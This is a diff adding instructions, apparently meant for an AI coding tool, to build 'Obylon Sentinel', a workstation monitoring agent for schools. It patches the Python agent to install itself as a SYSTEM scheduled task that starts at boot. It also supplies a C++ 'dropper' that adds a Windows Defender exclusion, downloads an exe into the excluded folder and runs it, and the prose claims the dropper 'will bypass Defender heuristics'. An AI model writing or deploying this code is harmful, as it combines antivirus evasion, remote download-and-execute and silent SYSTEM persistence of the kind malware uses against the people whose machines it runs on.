@@ -1,0 +1,203 @@
+Target File: sentinel_agent.py
+
+Objective: The previous patch failed to add the headless --enroll argument to the main execution block. Inject the headless provisioning logic so the C++ dropper can pass the token to the agent.
+
+Locate the if __name__ == "__main__": block at the absolute bottom of the file. Replace the entire block with this exact code:
+
+Python
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(description="Obylon Endpoint Agent")
+    parser.add_argument("--enroll", type=str, help="Headless license enrollment token")
+    args = parser.parse_args()
+
+    # --- HEADLESS ENROLLMENT (CALLED BY C++ DROPPER) ---
+    if args.enroll:
+        print("[*] Beginning headless secure enrollment...")
+        token = args.enroll.strip()
+        # NOTE: Replace with your actual project URL/Key before compiling!
+        sb_url = "YOUR_SUPABASE_URL"
+        sb_key = "YOUR_SUPABASE_ANON_KEY"
+        
+        try:
+            temp_sb = create_client(sb_url, sb_key)
+            hw_uuid = load_or_create_hardware_uuid()
+            workstation_name = get_workstation_identity()
+            
+            res = temp_sb.rpc("enroll_node", {
+                "p_token": token,
+                "p_hw_uuid": hw_uuid,
+                "p_name": workstation_name,
+                "p_os_info": os_info()
+            }).execute()
+            
+            school_name = res.data.get("school_name")
+            expires_at = res.data.get("expires_at")
+            
+            print(f"[+] Enrolled to: {school_name}")
+            vault.provision(sb_url, sb_key, token, school_name, expires_at)
+            
+            exe_path = sys.executable
+            print("[*] Registering NT AUTHORITY\\SYSTEM Boot Service...")
+            subprocess.run(f'schtasks /create /tn "ObylonSentinel" /tr "{exe_path}" /sc onstart /ru SYSTEM /rl HIGHEST /f', shell=True, capture_output=True)
+            subprocess.run('schtasks /run /tn "ObylonSentinel"', shell=True, capture_output=True)
+            print("[SUCCESS] Agent Armed.")
+            sys.exit(0)
+            
+        except Exception as e:
+            print(f"[-] FATAL Enrollment Error: {e}")
+            sys.exit(1)
+
+    # --- STANDARD SILENT BOOT ---
+    BuildInfo.print_banner()
+    harden_installation()
+
+    if not vault.load():
+        logger.error("Agent is not provisioned. System entering stasis.", component="system")
+        sys.exit(1)
+        
+    # --- LICENSE EXPIRY CHECK (ANTI-TAMPER) ---
+    expiry_str = vault.get("EXPIRES_AT")
+    if expiry_str:
+        try:
+            expiry_date = datetime.fromisoformat(expiry_str.replace("Z", "+00:00"))
+            if datetime.now(timezone.utc) > expiry_date:
+                logger.critical("FATAL: LICENSE EXPIRED. System entering stasis.", component="license", expiry=expiry_str)
+                while True: time.sleep(3600)
+        except Exception as e:
+            logger.error("Failed to parse license expiry", component="license", error=str(e))
+
+    raw_log_vault = vault.get("LOG_ONLY_MODE")
+    raw_strict_vault = vault.get("STRICT_WARDEN")
+    
+    LOG_ONLY_MODE = str(raw_log_vault).lower() in ("true", "1", "yes") if raw_log_vault else True
+    STRICT_WARDEN = str(raw_strict_vault).lower() in ("true", "1", "yes") if raw_strict_vault else False
+
+    WARDEN = WorkstationGuard()
+    if WARDEN.start():
+        logger.info("Warden hooks installed and running in background.", component="boot")
+    else:
+        logger.error("Warden failed to start - check admin rights", component="boot")
+    
+    if LOG_ONLY_MODE:
+        logger.warning("🚨 LOG_ONLY_MODE ENABLED - Warden will suppress physical freezes.", component="boot")
+    else:
+        logger.info("🛡️ STRICT ENFORCEMENT ENABLED - Warden is fully armed.", component="boot")
+        
+    time.sleep(0.5)
+
+    try:
+        sb = create_client(vault.get("SUPABASE_URL"), vault.get("SUPABASE_KEY"))
+    except Exception as e:
+        sys.exit(f"[FATAL] Supabase linkage failed: {e}")
+
+    main()
+(Once the CLI applies this, put your Supabase URL/Key in the sb_url variables, and compile sentinel_agent.py using PyInstaller into ObylonSentinel.exe. Upload that .exe to your Supabase releases bucket).
+
+Phase 2: The Native C++ Setup Wizard
+This is your commercial dropper. Because it is written in pure C++ using standard Windows APIs, it will bypass Defender heuristics.
+
+What it does:
+
+Checks for Admin rights (prompts if missing).
+
+Creates the C:\ProgramData\Obylon folder.
+
+Excludes that specific folder from Windows Defender via PowerShell.
+
+Uses the Windows URLDownloadToFile API to grab the Python payload from your bucket and drops it straight into the excluded safe zone.
+
+Executes the Python payload with the --enroll <TOKEN> command.
+
+Create a file named setup.cpp and paste this in:
+
+C++
+#include <windows.h>
+#include <iostream>
+#include <string>
+#include <urlmon.h>
+
+#pragma comment(lib, "urlmon.lib")
+
+using namespace std;
+
+// Checks if the executable is running with elevated privileges
+bool IsRunAsAdmin() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+            fRet = Elevation.TokenIsElevated;
+        }
+    }
+    if (hToken) CloseHandle(hToken);
+    return fRet;
+}
+
+int main() {
+    // 1. Branding
+    cout << "===================================================\n";
+    cout << "   OBYLON SENTINEL - ENTERPRISE SETUP WIZARD\n";
+    cout << "===================================================\n\n";
+
+    // 2. Privilege Check
+    if (!IsRunAsAdmin()) {
+        cout << "[!] Administrator privileges required.\n";
+        cout << "[*] Please right-click this installer and select 'Run as Administrator'.\n";
+        system("pause");
+        return 1;
+    }
+
+    cout << "[+] Administrator Privileges Confirmed.\n";
+    
+    // 3. License Token Prompt
+    string token;
+    cout << "Enter School License Token (UUID): ";
+    cin >> token;
+
+    // 4. Create Safe Zone
+    string targetDir = "C:\\ProgramData\\Obylon";
+    CreateDirectoryA(targetDir.c_str(), NULL);
+
+    // 5. Exclude Safe Zone from Windows Defender
+    cout << "\n[*] Configuring Windows Defender Exclusions...\n";
+    string psCommand = "powershell -Command \"Add-MpPreference -ExclusionPath '" + targetDir + "'\"";
+    system(psCommand.c_str());
+
+    // --- CONFIGURE YOUR PAYLOAD URL HERE ---
+    string url = "https://YOUR_SUPABASE_URL.supabase.co/storage/v1/object/public/releases/ObylonSentinel.exe";
+    string destPath = targetDir + "\\obylon_agent.exe";
+
+    // 6. Download Payload into Safe Zone
+    cout << "[*] Downloading Obylon Payload from Secure Cloud...\n";
+    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destPath.c_str(), 0, NULL);
+
+    if (SUCCEEDED(hr)) {
+        cout << "[*] Download successful. Executing Secure Enrollment...\n";
+        
+        // 7. Execute the payload to trigger the Supabase RPC and Vault provisioning
+        string cmd = "\"" + destPath + "\" --enroll " + token;
+        
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        
+        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            cout << "\n[SUCCESS] Obylon Sentinel has been successfully installed and armed.\n";
+            cout << "[SUCCESS] The agent is now running silently in the background.\n";
+        } else {
+            cout << "[-] FATAL: Failed to execute the payload.\n";
+        }
+    } else {
+        cout << "[-] FATAL: Download failed. Please check network connectivity or URL.\n";
+    }
+
+    cout << "\nPress Enter to exit...";
+    cin.ignore();
+    cin.get();
+    return 0;
+}
